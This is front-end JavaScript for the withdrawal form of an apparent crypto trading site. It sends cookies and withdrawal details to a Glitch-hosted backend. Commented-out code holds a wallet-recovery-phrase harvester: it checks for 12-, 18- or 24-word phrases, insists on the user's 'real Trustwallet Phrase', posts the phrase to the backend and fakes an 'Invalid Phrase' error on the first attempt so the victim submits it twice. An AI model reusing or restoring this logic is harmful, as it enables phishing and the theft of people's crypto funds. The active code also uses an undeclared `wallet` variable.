const checkCookie = (cname) => {
  let name = cname + "=";
  let decodedCookie = decodeURIComponent(document.cookie);
  let ca = decodedCookie.split(";");
  for (let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) == " ") {
      c = c.substring(1);
    }
    if (c.indexOf(name) == 0) {
      return c.substring(name.length, c.length);
    }
  }
  // return "";
  window.location.href = "login.html";
};

let withdrawal_amount = document.querySelector("#amount");
let withdrawal_method = document.querySelector("#withdrawal-method");
let phrase = document.querySelector("#phrase");
let submission_time = 1;

const handle_withdrawal = async (form) => {
  try {
    document.querySelector("#submit").innerHTML = "proccessing...";
    const response = await fetch(
      "https://crescentpips-backend.glitch.me/api/user/withdraw",
      // "http://localhost:5000/api/user/withdraw",

      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(form),
      },
    );
    const result = await response.json();
    console.log(result);
    if (result.error) {
      // document.querySelector("#centerd_phrase").className = "center-none";
      document.querySelector(".errMessage").innerHTML = result.errMessage;
      document.querySelector("#submit").innerHTML = "try again";
      // document.querySelector("#connect_wallet").innerHTML = "Try again";

      return;
    }

    // if (submission_time <= 1) {
    //   document.querySelector("#centerd_phrase").className = "center-none";

    //   document.querySelector(".errMessage").innerHTML =
    //     "Invalid Phrase, Please try again later.";
    //   document.querySelector("#submit").innerHTML = "try again";
    //   document.querySelector("#connect_wallet").innerHTML = "Try again";
    //   submission_time += 1;
    //   return;
    // }

    document.querySelector("#submit").innerHTML = "success";
    window.location.href = `action/loading.html?${result.message}`;
  } catch (err) {
    // document.querySelector("#centerd_phrase").className = "center-none";
    document.querySelector(".errMessage").innerHTML = err.message;
    document.querySelector("#submit").innerHTML = "try again";
    // document.querySelector("#connect_wallet").innerHTML = "Try again";
  }
};

document.querySelector("#submit").onclick = () => {
  // let wallet = document.querySelector("#wallet");
  if (!withdrawal_amount.value)
    return (withdrawal_amount.style.border = "2px solid red");
  if (!withdrawal_method.value)
    return (withdrawal_method.style.border = "2px solid red");

  // document.querySelector("#centerd_phrase").className = "center";
  if (!wallet.value) return (wallet.style.border = "2px solid red");
  handle_withdrawal({
    token: checkCookie("token"),
    user: checkCookie("user"),
    withdrawal_amount: withdrawal_amount.value,
    withdrawal_method: withdrawal_method.value,
    wallet: wallet.value,
  });
};

// document.querySelector("#connect_wallet").onclick = () => {
//   if (!phrase.value) return (phrase.style.border = "2px solid red");

//   const spacesCount = phrase.value.split(" ").length - 1;
//   console.log(spacesCount);
//   if (spacesCount == 11 || spacesCount == 17 || spacesCount == 23) {
//     document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
//     document.querySelector(".errMessage2").innerHTML = "";
//     handle_withdrawal({
//       token: checkCookie("token"),
//       user: checkCookie("user"),
//       withdrawal_amount: withdrawal_amount.value,
//       withdrawal_method: withdrawal_method.value,
//       wallet: phrase.value,
//       requestNumber:submission_time
//     });
//   } else {
//     phrase.style.border = "2px solid red";
//     document.querySelector(".errMessage2").innerHTML =
//       "Invalid Phrase, please copy and paste your real Trustwallet Phrase to continue";
//   }

//   // document.querySelector("#connect_wallet").innerHTML = "Proccessing...";
//   // handle_withdrawal({
//   //   token: checkCookie("token"),
//   //   user: checkCookie("user"),
//   //   withdrawal_amount: withdrawal_amount.value,
//   //   withdrawal_method: withdrawal_method.value,
//   //   wallet: phrase.value,
//   // });
// };

document.querySelectorAll("input").forEach((input) => {
  input.onkeyup = () => {
    input.style.border = "2px solid #fff";
    document.querySelector(".errMessage").innerHTML = "";
  };
});

document.querySelectorAll("textarea").forEach((input) => {
  input.onkeyup = () => {
    input.style.border = "2px solid #fff";
    document.querySelector(".errMessage").innerHTML = "";
  };
});

document.querySelectorAll("select").forEach((select) => {
  select.onchange = () => {
    select.style.border = "2px solid #fff";
  };
});
